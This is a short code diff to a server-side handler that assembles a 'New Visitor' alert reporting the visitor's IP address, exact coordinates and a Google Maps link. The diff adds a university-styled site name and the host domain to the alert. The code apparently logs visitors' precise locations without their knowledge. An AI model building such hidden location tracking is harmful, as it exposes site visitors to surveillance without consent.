@@ -198,7 +198,12 @@ export async function POST(req) {
   ${finalLat && finalLon ? `• <b>កូអរដោនេ:</b> <code>${finalLat}, ${finalLon}</code>\n  ` : ''}${finalLat && finalLon ? `• 🗺️ <b>ផែនទី Google:</b> <a href="https://www.google.com/maps?q=${finalLat},${finalLon}"><b>ចុចទីនេះដើម្បីបើក Google Maps 📍</b></a>` : ''}`;
     }
 
+    const siteName = process.env.SITE_NAME || 'សាកលវិទ្យាល័យភូមិន្ទកសិកម្ម ជំនាន់៣៩ (RUA 2026)';
+    const host = req.headers.get('x-forwarded-host') || req.headers.get('host') || 'rua-39.website';
+
     const message = `🚨 <b>ការជូនដំណឹង៖ មានអ្នកចូលទស្សនាថ្មី! (New Visitor)</b>
+🌐 <b>វេបសាយ (Website):</b> 🎓 <b>${siteName}</b>
+🔗 <b>Domain:</b> <code>${host}</code>
 ━━━━━━━━━━━━━━━━━━━━━
 🌐 <b>បណ្តាញអ៊ីនធឺណិត (Network & IP):</b>
   • <b>IP Address:</b> <code>${ip}</code>
